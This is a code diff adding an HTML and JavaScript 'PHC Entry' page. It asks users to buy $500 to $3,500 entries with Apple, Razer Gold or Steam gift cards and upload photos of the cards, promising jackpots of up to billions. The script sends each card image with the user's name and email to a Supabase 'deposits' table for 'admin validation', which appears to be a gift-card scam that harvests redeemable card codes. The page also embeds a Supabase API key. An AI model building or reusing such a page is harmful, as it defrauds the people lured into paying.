@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHC Entry</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+
+    <style>
+        .amount-list {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .amount {
+            background: #f1f5f9;
+            padding: 18px 20px;
+            border-radius: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border: 2px solid transparent;
+            position: relative;
+        }
+        body.dark .amount {
+            background: #1a2a3a;
+            color: #e8ecf1;
+        }
+        .amount:hover {
+            background: #004b87;
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 25px rgba(0,75,135,0.15);
+        }
+        body.dark .amount:hover {
+            background: #004b87;
+        }
+        .amount.selected {
+            background: #004b87;
+            color: white;
+            border-color: #f5b342;
+            box-shadow: 0 0 0 3px rgba(245,179,66,0.3);
+        }
+        .amount .entry-price {
+            font-size: 18px;
+        }
+        .amount .prize-tag {
+            background: rgba(245,179,66,0.15);
+            color: #f5b342;
+            padding: 4px 14px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 800;
+        }
+        body.dark .amount .prize-tag {
+            background: rgba(245,179,66,0.2);
+        }
+        .amount.selected .prize-tag {
+            background: rgba(255,255,255,0.2);
+            color: #fff;
+        }
+        .amount .card-icon {
+            font-size: 20px;
+            margin-right: 10px;
+        }
+        .amount .entry-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .amount .entry-details {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+        }
+        .amount .entry-details .sub {
+            font-size: 11px;
+            color: #7a8a9a;
+            font-weight: 500;
+        }
+        body.dark .amount .entry-details .sub {
+            color: #94a3b8;
+        }
+        .amount.selected .entry-details .sub {
+            color: rgba(255,255,255,0.7);
+        }
+        .play-btn {
+            border: none;
+            background: #004b87;
+            color: white;
+            padding: 14px 28px;
+            border-radius: 30px;
+            font-weight: 800;
+            cursor: pointer;
+            width: 100%;
+            font-size: 16px;
+            margin-top: 10px;
+            transition: 0.3s;
+        }
+        .play-btn:hover {
+            background: #003b6b;
+            transform: scale(1.01);
+        }
+        .play-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .upload-area {
+            border: 2px dashed #dce5f0;
+            border-radius: 12px;
+            padding: 30px 20px;
+            text-align: center;
+            cursor: pointer;
+            background: #f8fafc;
+            margin: 15px 0;
+            transition: 0.3s;
+        }
+        body.dark .upload-area {
+            background: #1a2a3a;
+            border-color: #2a4a6a;
+        }
+        .upload-area:hover {
+            background: #eef6ff;
+            border-color: #004b87;
+        }
+        body.dark .upload-area:hover {
+            background: #1a2a4a;
+            border-color: #f5b342;
+        }
+        .upload-area img {
+            max-width: 100%;
+            max-height: 120px;
+            border-radius: 8px;
+            display: none;
+            margin-top: 10px;
+        }
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #1a2a3a;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 14px;
+            font-weight: 600;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.3);
+            opacity: 0;
+            transition: opacity 0.4s ease;
+            z-index: 999;
+            max-width: 90%;
+            text-align: center;
+            pointer-events: none;
+        }
+        .toast.show { opacity: 1; }
+        .success-box {
+            display: none;
+            background: #e6f7e6;
+            border: 2px solid #1a8a4a;
+            border-radius: 16px;
+            padding: 30px;
+            margin-top: 20px;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        body.dark .success-box {
+            background: #1a3a2a;
+            border-color: #10b981;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .success-box .icon {
+            font-size: 50px;
+            color: #1a8a4a;
+            display: block;
+            margin-bottom: 10px;
+        }
+        body.dark .success-box .icon {
+            color: #10b981;
+        }
+        .success-box h3 {
+            color: #1a8a4a;
+            margin: 0 0 8px 0;
+            font-size: 22px;
+        }
+        body.dark .success-box h3 {
+            color: #10b981;
+        }
+        .success-box p {
+            color: #3a5a6a;
+            margin: 0;
+            font-size: 15px;
+        }
+        body.dark .success-box p {
+            color: #94a3b8;
+        }
+        .game-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 5px;
+        }
+        .game-header .game-icon {
+            font-size: 32px;
+            width: 50px;
+            height: 50px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #e8f2ff;
+            color: #004b87;
+        }
+        body.dark .game-header .game-icon {
+            background: #1a2a4a;
+            color: #f5b342;
+        }
+        .game-header .game-title {
+            font-size: 24px;
+            font-weight: 800;
+            color: #0a1a2a;
+        }
+        body.dark .game-header .game-title {
+            color: #f8fafc;
+        }
+        .game-header .game-title small {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: #7a8a9a;
+        }
+        body.dark .game-header .game-title small {
+            color: #94a3b8;
+        }
+        .prize-highlight {
+            background: linear-gradient(135deg, #f5b342, #f59e0b);
+            padding: 12px 16px;
+            border-radius: 14px;
+            margin: 10px 0 16px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #0a1a2a;
+        }
+        .prize-highlight .label {
+            font-size: 13px;
+            font-weight: 600;
+        }
+        .prize-highlight .value {
+            font-size: 20px;
+            font-weight: 900;
+        }
+        body.dark .prize-highlight {
+            color: #f8fafc;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="app">
+
+        <div class="topbar">
+            <div class="logo">
+                <i class="fas fa-arrow-left" onclick="history.back()"></i>
+                Entry
+            </div>
+        </div>
+
+        <div class="welcome">
+            <div class="game-header">
+                <div class="game-icon" id="gameIcon">
+                    <i class="fab fa-apple"></i>
+                </div>
+                <div class="game-title" id="gameTitle">
+                    Apple Card Entry
+                    <small>Choose your entry level</small>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="prize-highlight">
+                <span class="label">🏆 Jackpot Prize</span>
+                <span class="value" id="selectedPrizeDisplay">Up to 4.5 Billion</span>
+            </div>
+
+            <div class="amount-list" id="amountList">
+                <!-- Buttons will be generated by JavaScript -->
+            </div>
+        </div>
+
+        <div class="card">
+            <h2>Upload Card Photo</h2>
+            <p>Upload card images for verification</p>
+
+            <div class="upload-area" onclick="document.getElementById('fileInput').click()">
+                <i class="fas fa-camera" style="font-size:24px; color:#004b87; display:block; margin-bottom:6px;"></i>
+                <div style="font-size:13px; color:#7a8a9a;">Tap to take a photo</div>
+                <input type="file" id="fileInput" accept="image/*" capture="environment" style="display:none;" />
+                <img id="photoPreview" src="#" alt="preview" />
+            </div>
+
+            <button class="play-btn" id="submitBtn" onclick="submitEntry()">
+                <i class="fas fa-arrow-right"></i> Next
+            </button>
+
+            <div class="success-box" id="successBox">
+                <span class="icon">✅</span>
+                <h3>Successful!</h3>
+                <p>Your entry has been submitted. Please wait for admin validation.</p>
+            </div>
+        </div>
+
+    </div>
+
+    <div class="toast" id="toast">Message</div>
+
+    <script>
+        // ==========================================================
+        // GLOBAL DARK MODE LOADER
+        // ==========================================================
+        (function() {
+            if (localStorage.getItem("phc_dark_mode") === "true") {
+                document.body.classList.add("dark");
+            }
+        })();
+
+        // ==========================================================
+        // SUPABASE CONFIG
+        // ==========================================================
+        const SUPABASE_URL = "https://gcesrhfyupmkrevaqpfr.supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdjZXNyaGZ5dXBta3JldmFxcGZyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI4MjQ0MjAsImV4cCI6MjA5ODQwMDQyMH0.LarBYjP0Eg4HfFV_x5GVS7K1d4AuRfBWOjo0D1kL2xM";
+
+        // ==========================================================
+        // STATE & HELPERS
+        // ==========================================================
+        let selectedAmount = 0;
+        let selectedCard = "";
+        let selectedPrize = 0;
+        let selectedPrizeFormatted = "";
+
+        function showToast(msg, duration = 3000) {
+            const toast = document.getElementById('toast');
+            toast.textContent = msg;
+            toast.classList.add('show');
+            clearTimeout(toast._timer);
+            toast._timer = setTimeout(() => toast.classList.remove('show'), duration);
+        }
+
+        function getCurrentUser() {
+            const localUser = JSON.parse(localStorage.getItem('phc_current_user'));
+            if (!localUser || !localUser.email) return null;
+            return localUser;
+        }
+
+        async function saveToSupabase(table, data) {
+            try {
+                const response = await fetch(`${SUPABASE_URL}/rest/v1/${table}`, {
+                    method: 'POST',
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+                        'Content-Type': 'application/json',
+                        'Prefer': 'return=minimal'
+                    },
+                    body: JSON.stringify(data)
+                });
+                if (!response.ok) {
+                    console.log("Supabase save skipped.");
+                }
+            } catch (error) {
+                console.log("Supabase connection blocked. Proceeding anyway.");
+            }
+        }
+
+        function formatCurrency(val) {
+            return val.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+        }
+
+        function formatPrize(val) {
+            if (val >= 1000000000) {
+                return (val / 1000000000).toFixed(1) + ' Billion';
+            } else if (val >= 1000000) {
+                return (val / 1000000).toFixed(0) + ' Million';
+            } else {
+                return '$' + formatCurrency(val);
+            }
+        }
+
+        // ==========================================================
+        // PRIZE TABLE - PROFESSIONAL PRIZES
+        // ==========================================================
+        const prizeTable = {
+            'Apple Card': {
+                500: { prize: 100000000, label: '100 Million' },
+                1500: { prize: 2500000000, label: '2.5 Billion' },
+                2000: { prize: 4500000000, label: '4.5 Billion' },
+                3500: { prize: 4500000000, label: '4.5 Billion' }
+            },
+            'Razer Gold': {
+                500: { prize: 200000000, label: '200 Million' },
+                1500: { prize: 4000000000, label: '4 Billion' },
+                2000: { prize: 6000000000, label: '6 Billion' },
+                3500: { prize: 6000000000, label: '6 Billion' }
+            },
+            'Steam Card': {
+                500: { prize: 50000000, label: '50 Million' },
+                1500: { prize: 1000000000, label: '1 Billion' },
+                2000: { prize: 2000000000, label: '2 Billion' },
+                3500: { prize: 2000000000, label: '2 Billion' }
+            }
+        };
+
+        // ==========================================================
+        // ICON MAPPING
+        // ==========================================================
+        const cardIcons = {
+            'Apple Card': 'fab fa-apple',
+            'Razer Gold': 'fas fa-bolt',
+            'Steam Card': 'fab fa-steam'
+        };
+
+        const cardColors = {
+            'Apple Card': '#004b87',
+            'Razer Gold': '#00ff00',
+            'Steam Card': '#1b2838'
+        };
+
+        // ==========================================================
+        // BUILD ENTRY BUTTONS
+        // ==========================================================
+        function buildEntryButtons() {
+            const game = localStorage.getItem('selectedGame') || 'Apple Card';
+            const iconClass = cardIcons[game] || 'fab fa-apple';
+            const iconColor = cardColors[game] || '#004b87';
+
+            document.getElementById('gameIcon').innerHTML = `<i class="${iconClass}" style="color:${iconColor};"></i>`;
+            document.getElementById('gameTitle').innerHTML = `
+                ${game} Entry
+                <small>Choose your entry level</small>
+            `;
+
+            const container = document.getElementById('amountList');
+            container.innerHTML = '';
+
+            const amounts = [500, 1500, 2000, 3500];
+            const cardData = prizeTable[game];
+            
+            if (!cardData) {
+                container.innerHTML = `<div class="amount" onclick="chooseAmount(this, 500, 'Apple Card')">$500 Apple Card</div>`;
+                return;
+            }
+
+            amounts.forEach(amount => {
+                const data = cardData[amount];
+                const prizeLabel = data ? data.label : '0';
+                const div = document.createElement('div');
+                div.className = 'amount';
+                div.onclick = function() { chooseAmount(this, amount, game, prizeLabel); };
+                div.innerHTML = `
+                    <div class="entry-info">
+                        <span class="card-icon"><i class="${iconClass}" style="color:${iconColor};"></i></span>
+                        <div class="entry-details">
+                            <span class="entry-price">$${formatCurrency(amount)}</span>
+                            <span class="sub">${game} Entry</span>
+                        </div>
+                    </div>
+                    <span class="prize-tag">🏆 Win ${prizeLabel}</span>
+                `;
+                container.appendChild(div);
+            });
+
+            // Update prize display
+            const firstAmount = amounts[0];
+            const firstData = cardData[firstAmount];
+            document.getElementById('selectedPrizeDisplay').textContent = 'Up to ' + (firstData ? firstData.label : '0');
+        }
+
+        // ==========================================================
+        // AMOUNT SELECTION
+        // ==========================================================
+        function chooseAmount(el, amount, card, prizeLabel) {
+            document.querySelectorAll('.amount').forEach(a => a.classList.remove('selected'));
+            el.classList.add('selected');
+            
+            selectedAmount = amount;
+            selectedCard = card;
+            selectedPrize = prizeTable[card][amount].prize;
+            selectedPrizeFormatted = prizeLabel;
+
+            localStorage.setItem('selectedAmount', '$' + amount);
+            localStorage.setItem('selectedCard', card);
+            localStorage.setItem('selectedPrize', selectedPrize);
+            localStorage.setItem('selectedPrizeLabel', prizeLabel);
+
+            // Update prize display
+            document.getElementById('selectedPrizeDisplay').textContent = prizeLabel;
+
+            showToast(`✅ Selected: $${formatCurrency(amount)} ${card} → Win ${prizeLabel}`);
+        }
+
+        // ==========================================================
+        // PHOTO PREVIEW
+        // ==========================================================
+        document.getElementById('fileInput').addEventListener('change', function(e) {
+            const file = this.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(ev) {
+                    document.getElementById('photoPreview').src = ev.target.result;
+                    document.getElementById('photoPreview').style.display = 'block';
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+
+        // ==========================================================
+        // SUBMIT ENTRY
+        // ==========================================================
+        async function submitEntry() {
+            const user = getCurrentUser();
+            if (!user) {
+                showToast('⚠️ Please login first.');
+                return;
+            }
+
+            const fileInput = document.getElementById('fileInput');
+            const files = fileInput.files;
+
+            if (!selectedAmount || selectedAmount <= 0) {
+                showToast('⚠️ Please select an entry level.');
+                return;
+            }
+
+            if (files.length === 0) {
+                showToast('⚠️ Please upload a card photo.');
+                return;
+            }
+
+            const btn = document.getElementById('submitBtn');
+            btn.textContent = '⏳ Submitting...';
+            btn.disabled = true;
+
+            try {
+                const file = files[0];
+                const reader = new FileReader();
+
+                reader.onload = async function(e) {
+                    const imageData = e.target.result;
+
+                    await saveToSupabase('deposits', {
+                        user_email: user.email,
+                        user_name: user.firstName + ' ' + user.lastName,
+                        card_type: selectedCard,
+                        amount: selectedAmount,
+                        target_prize: selectedPrize,
+                        image_url: imageData,
+                        status: 'pending'
+                    });
+
+                    await saveToSupabase('transactions', {
+                        user_email: user.email,
+                        name: `💳 Entry (${selectedCard}) - $${selectedAmount.toFixed(2)} (Pending)`,
+                        amount: 0
+                    });
+
+                    document.querySelector('.card:last-child .play-btn').style.display = 'none';
+                    document.getElementById('successBox').style.display = 'block';
+                    showToast(`✅ Your entry of $${selectedAmount.toFixed(2)} is pending validation.`);
+
+                    setTimeout(() => {
+                        window.location.href = 'bet.html';
+                    }, 2000);
+                };
+
+                reader.onerror = function() {
+                    showToast('⚠️ Photo read error. Proceeding anyway.');
+                    setTimeout(() => {
+                        window.location.href = 'bet.html';
+                    }, 2000);
+                    btn.textContent = 'Next';
+                    btn.disabled = false;
+                };
+
+                reader.readAsDataURL(file);
+
+            } catch (error) {
+                console.error(error);
+                showToast('⚠️ Error encountered. Proceeding to next step.');
+                setTimeout(() => {
+                    window.location.href = 'bet.html';
+                }, 2000);
+                btn.textContent = 'Next';
+                btn.disabled = false;
+            }
+        }
+
+        // ==========================================================
+        // INIT
+        // ==========================================================
+        document.addEventListener('DOMContentLoaded', buildEntryButtons);
+    </script>
+
+</body>
+</html>
